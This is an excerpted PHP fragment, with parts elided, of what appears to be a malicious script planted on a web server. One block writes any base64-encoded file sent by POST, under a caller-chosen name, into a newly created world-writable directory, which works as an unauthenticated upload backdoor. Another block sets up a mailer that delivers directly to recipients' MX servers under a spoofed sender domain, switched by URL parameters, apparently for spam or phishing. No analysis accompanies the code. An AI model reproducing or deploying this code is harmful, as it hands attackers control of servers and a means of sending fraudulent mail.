...
if(!empty($_POST['file']))
{
    ...
    if(!empty($_POST['root']) && $_POST['root'] == 'http_root')
    {
    ...
    {
        mkdir($path,0777,1);
        file_put_contents($path . $_POST['filename'], base64_decode($_POST['file']));
    }
    exit;
}
...
try {
    ...
    {
        $mail->Mailer = 'smtp';
        //$mail->Host = 'mx1.wc1.dfw1.stabletransit.com:25';
        $mail->Encoding = 'base64';
    }
    if(!empty($_GET['m']) && $_GET['m']=='d')
    {
        $mail->Mailer = 'smtp';
        ...
        $mail->Helo = $from_domain;
        $mail->Hostname = $from_domain;
        
        getmxrr($to_domain,$tmp);
        $mail->Host = implode(':25;',$tmp).':25';
    ...
    if(!empty($_GET['debug']) && $_GET['debug']=='d')
    {
        $mail->SMTPDebug =3;
    }
